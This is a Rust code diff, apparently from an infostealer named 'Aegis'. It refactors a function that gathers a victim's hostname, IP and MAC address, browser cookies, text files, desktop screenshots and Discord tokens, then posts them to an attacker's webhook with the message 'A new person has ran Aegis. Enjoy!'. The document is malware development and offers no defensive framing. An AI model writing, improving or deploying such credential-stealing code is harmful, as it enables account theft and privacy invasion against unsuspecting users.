@@ -6,7 +6,7 @@ pub async fn send_hook() {
     let uri: Option<&'static str> = option_env!("WEBHOOK_URI");
 
     let ip = grab::get_ip().await.unwrap_or_default();
-    let embeds = [ Embed {
+    let mut embeds = [ Embed {
                 title: "New Connection!".to_string(),
                 description: "A new person has ran Aegis. Enjoy!".to_string(),
                 footer: EmbedFooter {
@@ -20,75 +20,52 @@ pub async fn send_hook() {
                         name: "General Information".to_string(),
                         value: format!("Hostname: {:?}\nIP Address: {:?}\nMAC Address: {:?}", grab::get_host(), ip, grab::get_mac()),
                         inline: false,
-                    },
-                    if cfg!(feature = "grab_cookies") {
-                        WebhookField {
-                            name: "Browser Cookies".to_string(),
-                            value: format!("{:?}", grab::grab_cookies().await.unwrap().join(", ")),
-                            inline: false,
-                        }
-                    } else {
-                        return
-                    },
-                    WebhookField {
-                        name: "Crypto Wallets".to_string(),
-                        value: "".to_string(),
-                        inline: false,
-                    },
-                    WebhookField {
-                        name: "Text Files".to_string(),
-                        value: format!("{:?}", grab::grab_txts().await.unwrap().join(", ")),
-                        inline: false,
-                    },
-                    WebhookField {
-                        name: "Passwords".to_string(),
-                        value: "".to_string(),
-                        inline: false,
-                    },
-                    WebhookField {
-                        name: "PGP Keys".to_string(),
-                        value: "".to_string(),
-                        inline: false,
-                    },
-                    WebhookField {
-                        name: "Webcam Photo".to_string(),
-                        value: "".to_string(),
-                        inline: false,
-                    },
-                    if cfg!(feature = "desktop_screenshot") {
-                        WebhookField {
-                            name: "Desktop Screenshot(s)".to_string(),
-                            value: format!("{:?}", grab::screenshot_desktop_and_upload().await.unwrap().join(", ")),
-                            inline: false,
-                        }
-                    } else {
-                        return
-                    },
-                    if cfg!(feature = "grab_discord_token") {
-                        WebhookField {
-                            name: "Discord Token".to_string(),
-                            value: format!("`{}`", grab::grab_discord_token().await.unwrap_or(["Failed to get Discord token".to_string()].to_vec()).join("")),
-                            inline: false,
-                        }
-                    } else {
-                        return
-                    },
-                    WebhookField {
-                        name: "Minecraft SSID".to_string(),
-                        value: "".to_string(),
-                        inline: false,
-                    },
-                    if cfg!(feature = "remote_access") {
-                        WebhookField {
-                            name: "Remote Enabled:".to_string(),
-                            value: "Yes".to_string(),
-                            inline: false,
-                        }
-                    } else {
-                        return
                     }
                 ].to_vec(),
-            }];
+            }].to_vec();
+
+    if cfg!(feature = "grab_cookies") {
+        embeds[0].fields.push(WebhookField {
+            name: "Cookies".to_string(),
+            value: format!("{:?}", grab::grab_cookies().await.unwrap().join(", ")),
+            inline: false,
+        });
+    }
+    if cfg!(feature = "desktop_screenshot") {
+        embeds[0].fields.push(WebhookField {
+            name: "Desktop Screenshots".to_string(),
+            value: format!(
+                "{:?}",
+                grab::screenshot_desktop_and_upload()
+                    .await
+                    .unwrap()
+                    .join(", ")
+            )
+            .to_string(),
+            inline: false,
+        });
+    }
+    if cfg!(feature = "grab_discord_token") {
+        embeds[0].fields.push(WebhookField {
+            name: "Discord Token".to_string(),
+            value: format!(
+                "`{}`",
+                grab::grab_discord_token()
+                    .await
+                    .unwrap_or(["Failed to get Discord token".to_string()].to_vec())
+                    .join("")
+            )
+            .to_string(),
+            inline: false,
+        });
+    }
+    if cfg!(feature = "remote_access") {
+        embeds[0].fields.push(WebhookField {
+            name: "Remote Access".to_string(),
+            value: "Remote Access is enabled".to_string(),
+            inline: false,
+        });
+    }
 
     let hook = webhook::WebhookPayload {
                 username: "Aegis".to_string(),
